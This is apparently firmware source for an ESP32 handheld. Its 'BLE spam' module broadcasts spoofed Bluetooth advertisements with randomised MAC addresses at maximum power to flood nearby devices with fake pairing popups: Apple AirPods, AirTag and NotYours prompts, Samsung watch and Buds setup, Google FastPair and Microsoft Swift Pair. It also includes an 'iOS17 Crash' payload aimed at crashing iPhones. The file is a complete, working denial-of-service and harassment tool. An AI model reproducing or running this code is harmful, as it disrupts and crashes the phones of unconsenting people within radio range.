#include "ble_spam.h"

#include <Arduino.h>
#include <NimBLEDevice.h>
#include <esp_bt.h>
#include <esp_mac.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#include "../hal/ble_remote.h"
#include "../hal/encoder.h"

BleSpamModule g_bleSpam;

namespace {

static NimBLEAdvertising* s_adv         = nullptr;
static int8_t             s_advTxPower  = 0;

// Samsung Watch model IDs (EasySetup) — Watch4/5/6 from Marauder/simondankelmann
static const uint8_t watch_models[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x1B, 0x1C, 0x1D, 0x1E, 0x20
};

// Samsung Buds model IDs (EasySetup) — from simondankelmann/Bluetooth-LE-Spam
static const uint8_t buds_models[][3] = {
    {0xEE,0x7A,0x0C},{0x9D,0x17,0x00},{0x39,0xEA,0x48},{0xA7,0xC6,0x2C},
    {0x85,0x01,0x16},{0x3D,0x8F,0x41},{0x3B,0x6D,0x02},{0xAE,0x06,0x3C},
    {0xB8,0xB9,0x05},{0xEA,0xAA,0x17},{0xD3,0x07,0x04},{0x9D,0xB0,0x06},
    {0x10,0x1F,0x1A},{0x85,0x96,0x08},{0x8E,0x45,0x03},{0x2C,0x67,0x40},
    {0x3F,0x67,0x18},{0x42,0xC5,0x19},{0xAE,0x07,0x3A},{0x01,0x17,0x16},
};

// Samsung Buds scan response (18 bytes) — required for EasySetup Buds popup
static const uint8_t buds_sr[18] = {
    0x11, 0xFF, 0x75, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Google FastPair debug IDs (fire on any Android without Developer Mode)
static const uint8_t fp_debug[][3] = {
    {0x08,0x00,0x00},{0x09,0x00,0x00},{0x0A,0x00,0x00},{0x0A,0x00,0x7F},
    {0x0B,0x00,0x00},{0x0C,0x00,0x00},{0x35,0x00,0x00},{0x47,0x00,0x00},
    {0x48,0x00,0x00},{0x49,0x00,0x00},
};

// Google FastPair registered device IDs (subset)
static const uint8_t fp_models[][3] = {
    {0x00,0x00,0x08},{0x00,0x01,0x1A},{0x00,0x00,0x35},{0xC2,0x66,0x00},
    {0x71,0x8B,0x0F},{0x22,0x35,0x00},{0x1E,0x8E,0x0F},{0x72,0xEF,0x8F},
    {0x04,0x00,0x00},{0x2E,0x01,0x00},{0x01,0x00,0x00},{0x96,0x40,0x0F},
};

static void randMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = esp_random() & 0xFF;
    mac[5] |= 0xC0;
}

static void applyMaxTxPower() {
    NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_DEFAULT);
    NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
    NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_SCAN);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
}

static void bleSpamInit() {
    applyMaxTxPower();
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

    NimBLEServer* pServer = NimBLEDevice::getServer();
    if (!pServer) pServer = NimBLEDevice::createServer();
    s_adv = pServer->getAdvertising();
    s_adv->stop();
    s_adv->setMinInterval(0x20);
    s_adv->setMaxInterval(0x20);
    s_adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    s_adv->enableScanResponse(false);
}

static void sendBurstRaw(const uint8_t* buf, size_t len) {
    for (uint8_t n = 0; n < 6; n++) {
        uint8_t rmac[6];
        randMac(rmac);
        NimBLEDevice::setOwnAddr(rmac);
        NimBLEAdvertisementData ad;
        ad.addData(buf, len);
        s_adv->setAdvertisementData(ad);
        s_adv->start();
        delay(40);
        s_adv->stop();
    }
}

static void sendBurst(const uint8_t* buf, size_t len) {
    uint8_t combined[31];
    const uint8_t* ptr  = buf;
    size_t         total = len;
    if (len + 3 <= 31) {
        combined[0] = 0x02;
        combined[1] = 0x0A;
        combined[2] = static_cast<uint8_t>(s_advTxPower);
        memcpy(combined + 3, buf, len);
        ptr   = combined;
        total = len + 3;
    }
    for (uint8_t n = 0; n < 6; n++) {
        uint8_t rmac[6];
        randMac(rmac);
        NimBLEDevice::setOwnAddr(rmac);
        NimBLEAdvertisementData ad;
        ad.addData(ptr, total);
        s_adv->setAdvertisementData(ad);
        s_adv->start();
        delay(40);
        s_adv->stop();
    }
}

// ---- Apple payloads ----------------------------------------------------------

static void spamAppleAction() {
    const uint8_t acts[] = {
        0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B,0x05,0x24,0x2F,0x21
    };
    uint8_t act  = acts[esp_random() % sizeof(acts)];
    uint8_t flag = 0xC0;
    if (act == 0x21)                         flag = 0x40;
    else if (act == 0x20 && (esp_random()&1)) flag = 0xBF;
    else if (act == 0x09 && (esp_random()&1)) flag = 0x40;
    uint8_t buf[] = {
        0x0A, 0xFF, 0x4C, 0x00,
        0x0F, 0x05, flag, act,
        (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF)
    };
    sendBurst(buf, sizeof(buf));
}

static void spamAppleAirPods() {
    // NewDevicePopUp (prefix=0x07) — AirPods / Beats / Solo3 / Powerbeats
    const uint16_t dev_types[] = {
        0x0E20,0x0A20,0x0220,0x0F20,0x1320,0x1420,0x1020,0x0620,0x0320,
        0x0B20,0x0C20,0x1120,0x0520,0x0920,0x1720,0x1220,0x1620,
        0x1820,0x1920,0x1A20,0x1B20,0x1C20,0x1D20,0x1E20,0x1F20,
        0x0720,0x0820,0x0D20,0x0420,0x0120,0x2420,0x2520
    };
    uint16_t dtype = dev_types[esp_random() % (sizeof(dev_types)/sizeof(dev_types[0]))];
    uint8_t buf[31];
    uint8_t i = 0;
    buf[i++]=0x1E; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x07; buf[i++]=0x19; buf[i++]=0x07;  // NewDevicePopUp
    buf[i++]=(dtype>>8)&0xFF; buf[i++]=dtype&0xFF;
    buf[i++]=0x55;
    buf[i++]=(uint8_t)(esp_random()&0xFF);
    buf[i++]=(uint8_t)(esp_random()&0xFF);
    buf[i++]=(uint8_t)(esp_random()&0xFF);
    buf[i++]=0x00; buf[i++]=0x00;
    for (int k=0; k<16; k++) buf[i++]=(uint8_t)(esp_random()&0xFF);
    sendBurst(buf, 31);
}

static void spamAppleAirTag() {
    // NewAirtagPopUp (prefix=0x05) — AirTag / Hermes AirTag
    const uint16_t airtag_types[] = {0x0055, 0x0030};
    uint16_t atype = airtag_types[esp_random() % 2];
    uint8_t buf[31];
    uint8_t i = 0;
    buf[i++]=0x1E; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
    buf[i++]=0x07; buf[i++]=0x19; buf[i++]=0x05;  // NewAirtagPopUp
    buf[i++]=(atype>>8)&0xFF; buf[i++]=atype&0xFF;
    buf[i++]=0x55;
    buf[i++]=(uint8_t)(esp_random()&0xFF);
    buf[i++]=(uint8_t)(esp_random()&0xFF);
    buf[i++]=(uint8_t)(esp_random()&0xFF);
    buf[i++]=0x00; buf[i++]=0x00;
    for (int k=0; k<16; k++) buf[i++]=(uint8_t)(esp_random()&0xFF);
    sendBurst(buf, 31);
}

static void spamAppleNearby() {
    // NotYoursDevice (prefix=0x01) + iOS17 Crash variant
    if (esp_random() & 1) {
        // NotYours
        const uint16_t types[] = {
            0x0E20,0x0A20,0x0220,0x0F20,0x1320,0x1420,0x1020,0x0620,
            0x0320,0x0B20,0x0C20,0x1120,0x0520,0x0920,0x1720,0x1220,0x1620
        };
        uint16_t t = types[esp_random() % 17];
        uint8_t buf[31];
        uint8_t i = 0;
        buf[i++]=0x1E; buf[i++]=0xFF; buf[i++]=0x4C; buf[i++]=0x00;
        buf[i++]=0x07; buf[i++]=0x19; buf[i++]=0x01;  // NotYours
        buf[i++]=(t>>8)&0xFF; buf[i++]=t&0xFF;
        buf[i++]=0x55;
        buf[i++]=(uint8_t)(esp_random()&0xFF);
        buf[i++]=(uint8_t)(esp_random()&0xFF);
        buf[i++]=(uint8_t)(esp_random()&0xFF);
        buf[i++]=0x00; buf[i++]=0x00;
        for (int k=0; k<16; k++) buf[i++]=(uint8_t)(esp_random()&0xFF);
        sendBurst(buf, 31);
    } else {
        // iOS17 Crash — NearbyAction with trailing bytes
        const uint8_t crash_acts[] = {0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B};
        uint8_t cact = crash_acts[esp_random() % sizeof(crash_acts)];
        uint8_t cflag = (cact == 0x20) ? 0xBF : (((cact==0x09)&&(esp_random()&1)) ? 0x40 : 0xC0);
        uint8_t buf[] = {
            0x10, 0xFF, 0x4C, 0x00,
            0x0F, 0x05, cflag, cact,
            (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),
            0x00, 0x00, 0x10,
            (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF)
        };
        sendBurst(buf, sizeof(buf));
    }
}

static void spamApple() {
    switch (esp_random() % 4) {
        case 0: spamAppleAction();  break;
        case 1: spamAppleAirPods(); break;
        case 2: spamAppleAirTag();  break;
        case 3: spamAppleNearby();  break;
    }
}

// ---- Samsung payloads --------------------------------------------------------

static void spamSamsungWatch() {
    uint8_t model = watch_models[esp_random() % sizeof(watch_models)];
    uint8_t buf[] = {
        14, 0xFF, 0x75, 0x00,
        0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00,
        0x00, 0x43, model
    };
    // Clear any scan response left over from a previous Buds call
    NimBLEAdvertisementData empty_sr;
    s_adv->setScanResponseData(empty_sr);
    sendBurst(buf, sizeof(buf));
}

static void spamSamsungBuds() {
    uint8_t idx = esp_random() % (sizeof(buds_models)/sizeof(buds_models[0]));
    const uint8_t* id = buds_models[idx];
    uint8_t raw[28];
    uint8_t p = 0;
    raw[p++] = 27; raw[p++] = 0xFF;
    raw[p++] = 0x75; raw[p++] = 0x00;
    raw[p++] = 0x42; raw[p++] = 0x09; raw[p++] = 0x81; raw[p++] = 0x02; raw[p++] = 0x14;
    raw[p++] = 0x15; raw[p++] = 0x03; raw[p++] = 0x21; raw[p++] = 0x01; raw[p++] = 0x09;
    raw[p++] = id[0]; raw[p++] = id[1]; raw[p++] = 0x01; raw[p++] = id[2];
    raw[p++] = 0x06; raw[p++] = 0x3C; raw[p++] = 0x94; raw[p++] = 0x8E; raw[p++] = 0x00;
    raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0xC7; raw[p++] = 0x00;

    NimBLEAdvertisementData sr;
    sr.addData(buds_sr, sizeof(buds_sr));

    for (uint8_t n = 0; n < 6; n++) {
        uint8_t rmac[6];
        randMac(rmac);
        NimBLEDevice::setOwnAddr(rmac);
        NimBLEAdvertisementData ad;
        ad.addData(raw, sizeof(raw));
        s_adv->setScanResponseData(sr);
        s_adv->setAdvertisementData(ad);
        s_adv->start();
        delay(40);
        s_adv->stop();
    }
}

static void spamSamsung() {
    if (esp_random() & 1) spamSamsungWatch();
    else                   spamSamsungBuds();
}

// ---- Google / Microsoft ------------------------------------------------------

static void spamGoogle() {
    const uint8_t (*tbl)[3];
    uint8_t count;
    if ((esp_random() % 10) < 6) {
        tbl   = fp_debug;
        count = sizeof(fp_debug)/sizeof(fp_debug[0]);
    } else {
        tbl   = fp_models;
        count = sizeof(fp_models)/sizeof(fp_models[0]);
    }
    uint8_t di = esp_random() % count;
    uint8_t m0=tbl[di][0], m1=tbl[di][1], m2=tbl[di][2];
    // TX power randomized -60..+5 dBm (Marauder parity: keeps path_loss low → popup fires)
    int8_t txpwr = (int8_t)(-60 + (int)(esp_random() % 66));
    uint8_t buf[] = {
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE, m0, m1, m2,
        0x02, 0x0A, (uint8_t)txpwr,
    };
    sendBurstRaw(buf, sizeof(buf));
}

static void spamMicrosoft() {
    uint8_t nlen = 4 + (esp_random() % 7);
    if (nlen > 7) nlen = 7;
    uint8_t buf[14];
    uint8_t i = 0;
    buf[i++] = 6+nlen; buf[i++] = 0xFF;
    buf[i++] = 0x06; buf[i++] = 0x00;
    buf[i++] = 0x03; buf[i++] = 0x00; buf[i++] = 0x80;
    for (uint8_t k=0; k<nlen; k++) buf[i++] = 'A'+(esp_random()%26);
    sendBurst(buf, i);
}

// ---- Task --------------------------------------------------------------------

void bleNativeTask(void* arg) {
    BleSpamModule* self = reinterpret_cast<BleSpamModule*>(arg);

    uint8_t  cursor = 0;
    uint32_t count  = 0;
    uint32_t lastReport = millis();

    while (self->isRunning()) {
        applyMaxTxPower();
        s_advTxPower = self->getAdvTxPower();
        BleSpamType t = self->getType();
        switch (t) {
            case BleSpamType::APPLE:        spamApple();        break;
            case BleSpamType::APPLE_ACTION: spamAppleAction();  break;
            case BleSpamType::APPLE_AIRPODS:spamAppleAirPods(); break;
            case BleSpamType::APPLE_AIRTAG: spamAppleAirTag();  break;
            case BleSpamType::APPLE_NEARBY: spamAppleNearby();  break;
            case BleSpamType::GOOGLE:       spamGoogle();       break;
            case BleSpamType::SAMSUNG:      spamSamsung();      break;
            case BleSpamType::SAMSUNG_WATCH:spamSamsungWatch(); break;
            case BleSpamType::SAMSUNG_BUDS: spamSamsungBuds();  break;
            case BleSpamType::MICROSOFT:    spamMicrosoft();    break;
            default: // ALL
                switch (cursor % 10) {
                    case 0: case 5: spamAppleAction();  break;
                    case 1: case 6: spamAppleAirPods(); break;
                    case 2:         spamAppleAirTag();  break;
                    case 3:         spamAppleNearby();  break;
                    case 4:         spamGoogle();       break;
                    case 7:         spamSamsungWatch(); break;
                    case 8:         spamSamsungBuds();  break;
                    case 9:         spamMicrosoft();    break;
                }
                break;
        }
        cursor++;
        count++;

        if (millis() - lastReport >= 1000) {
            self->updateAdvsPerSec(count);
            count = 0;
            lastReport = millis();
        }
        vTaskDelay(1);
    }

    if (s_adv) s_adv->stop();
    self->clearTask();
    vTaskDelete(nullptr);
}

}  // namespace

bool BleSpamModule::init()        { return true; }
bool BleSpamModule::isAvailable() { return true; }

void BleSpamModule::start() {
    if (running_.exchange(true)) return;
    if (task_ != nullptr) { running_ = false; return; }
    ble_remote::stop();
    bleSpamInit();
    xTaskCreatePinnedToCore(bleNativeTask, "ble_spam", 8192, this, 1, &task_, 0);
}

void BleSpamModule::stop() {
    if (!running_) return;
    running_ = false;
    for (int i = 0; i < 100 && task_; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    task_ = nullptr;
    s_adv = nullptr;
    ble_remote::reinit();
}

void BleSpamModule::onEvent(uint8_t ev) {
    int8_t v = static_cast<int8_t>(advTxPower_.load());
    if (ev == static_cast<uint8_t>(encoder::EVENT_RIGHT)) {
        if (v < 127) v += 10;
        if (v > 127) v = 127;
        advTxPower_.store(static_cast<uint8_t>(v));
    } else if (ev == static_cast<uint8_t>(encoder::EVENT_LEFT)) {
        if (v > -127) v -= 10;
        if (v < -127) v = -127;
        advTxPower_.store(static_cast<uint8_t>(v));
    }
}

void BleSpamModule::fillStats(char* buf, size_t len) {
    int8_t adv = static_cast<int8_t>(advTxPower_.load());
    snprintf(buf, len, "%lu/s  ADV:%+ddBm",
             (unsigned long)adv_per_sec_.load(), (int)adv);
}
